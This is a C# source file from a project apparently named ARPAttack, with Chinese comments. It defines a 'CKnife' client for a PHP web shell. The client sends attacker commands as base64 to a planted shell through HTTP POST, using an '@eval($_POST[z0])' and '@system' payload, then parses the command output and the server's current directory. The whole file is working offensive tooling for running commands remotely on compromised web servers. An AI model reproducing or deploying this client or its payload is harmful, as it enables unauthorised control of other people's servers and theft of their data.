using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace ARPAttack
{
    class CKnife
    {
        string url; //链接
        string passwd; //POST参数名
        IDictionary<string, string> dic = new Dictionary<string, string>();  //POST参数字典
        string path;    //当前路径
        string reg = @"(?s)\[h2o\](.*?)\[h2o\]"; //(?s) 匹配任何字符（包括换行符） 匹配PHP代码执行结果
        string cmdReg = @"(?s)\[h2o\](.*?)\[S\]";    //匹配CMD命令执行结果中的内容
        string cmdPathReg = @"(?s)\[S\](.*?)\[E\]";    //匹配CMD命令执行结果中的路径

        public CKnife(string url, string passwd)
        {
            this.url = url;
            this.passwd = passwd;
            path = GetReturnPHP("echo getcwd();");  //初始化路径
        }

        /// <summary>
        /// 返回当前路径
        /// </summary>
        /// <returns></returns>
        public string ShowPath()
        {
            return path + ">\r\n";
        }

        /// <summary>
        /// 返回当前执行结果
        /// </summary>
        /// <returns></returns>
        public string ShowResult(string cmd)
        {
            string content = GetReturnCMD(cmd);
            string cmdPath = path;
            //MessageBox.Show(cmdPath);
            //MessageBox.Show(content);


            return cmdPath + ">" + cmd + "\r\n" +content+"\r\n"+cmdPath;
        }

        /// <summary>
        /// 执行PHP代码返回网页结果
        /// </summary>
        /// <param name="cmd"></param>
        /// <returns></returns>
        string GetReturnPHP(string cmd)
        {

            if (dic != null)
                dic.Clear();

            dic.Add(this.passwd, "echo ' [h2o] ';" + cmd + "echo ' [h2o] ';");

            string s = Regex.Match(GetResponseString(CreatePostHttpResponse(this.url, this.dic)), reg).Value;   //正则取网页执行结果
            //string s = GetResponseString(CreatePostHttpResponse(this.url, this.dic));   //取网页执行结果

            s = s.Substring(6, s.Length - 12);  //截取出内容

            return s;
        }

        /// <summary>
        /// 执行PHP代码返回网页结果
        /// </summary>
        /// <param name="cmd"></param>
        /// <returns></returns>
        string GetReturnCMD(string cmd)
        {
            cmd = string.Format("cmd &cd /d \"{0}\" &{1} &echo [S]&cd &echo [E]", path, cmd);  //cmd命令
            //cmd = string.Format("cmd &cd /d \"{0}\" &{1} &echo [S]&cd &echo [S]", path, cmd);  //cmd命令

            //将命令进行Base64编码，防止特殊字符传输失败的异常,如Shell命令中的&
            byte[] b = Encoding.UTF8.GetBytes(cmd);
            cmd = Convert.ToBase64String(b);

            //MessageBox.Show(cmd);

            if (dic != null) dic.Clear();

            //dic.Add(this.passwd, "echo \" h2o\";" + "system('" + cmd + "');" + "echo \"h2o \";");   //PHP代码执行CMD命令

            string phpCode = string.Format("echo ' [h2o]'; @eval($_POST[z0]); &z0=$r=base64_decode($_POST[z1]); @system($r,$ret); if($ret!=0) echo $ret;echo '[h2o] '; &z1={0}", cmd);  //php代码

            dic.Add(this.passwd, phpCode);   //PHP代码执行CMD命令

            //MessageBox.Show(dic[this.passwd]);

            //return GetResponseString(CreatePostHttpResponse(this.url, this.dic)); //返回网页执行结果

            string content = GetResponseString(CreatePostHttpResponse(this.url, this.dic)); //取网页执行结果

            string s = Regex.Match(content, cmdReg).Value;   //正则取CMD执行结果中的内容

            s = s.Replace("[h2o]", ""); //截取出内容,替换掉正则表达式中的用来匹配字符
            s = s.Replace("[S]", "");

            string cmdPath = Regex.Match(content, cmdPathReg).Value;   //正则取CMD执行结果中的路径
            cmdPath = cmdPath.Replace("[S]\r\n", "");
            cmdPath = cmdPath.Replace("\r\n[E]", "");


            //MessageBox.Show("1"+cmdPath+"1");

            path = cmdPath;

            return s;
        }

        /// 创建POST方式的HTTP请求  
        HttpWebResponse CreatePostHttpResponse(string url, IDictionary<string, string> parameters)
        {
            HttpWebRequest request = null;
            //如果是发送HTTPS请求  
            if (url.StartsWith("https", StringComparison.OrdinalIgnoreCase))
            {
                request = WebRequest.Create(url) as HttpWebRequest;
            }
            else
            {
                request = WebRequest.Create(url) as HttpWebRequest;
            }
            request.Method = "POST";
            request.ContentType = "application/x-www-form-urlencoded";

            //发送POST数据  
            if (!(parameters == null || parameters.Count == 0))
            {
                StringBuilder buffer = new StringBuilder();
                int i = 0;
                foreach (string key in parameters.Keys)
                {
                    if (i > 0)
                    {
                        buffer.AppendFormat("&{0}={1}", key, parameters[key]);
                    }
                    else
                    {
                        buffer.AppendFormat("{0}={1}", key, parameters[key]);
                        i++;
                    }
                }
                byte[] data = Encoding.ASCII.GetBytes(buffer.ToString());
                using (Stream stream = request.GetRequestStream())
                {
                    stream.Write(data, 0, data.Length);
                }
            }
            string[] values = request.Headers.GetValues("Content-Type");
            return request.GetResponse() as HttpWebResponse;
        }


        /// <summary>
        /// 获取请求的数据
        /// </summary>
        string GetResponseString(HttpWebResponse webresponse)
        {
            using (Stream s = webresponse.GetResponseStream())
            {
                StreamReader reader = new StreamReader(s, Encoding.GetEncoding("GBK"));
                return reader.ReadToEnd();
            }
        }
    }
}
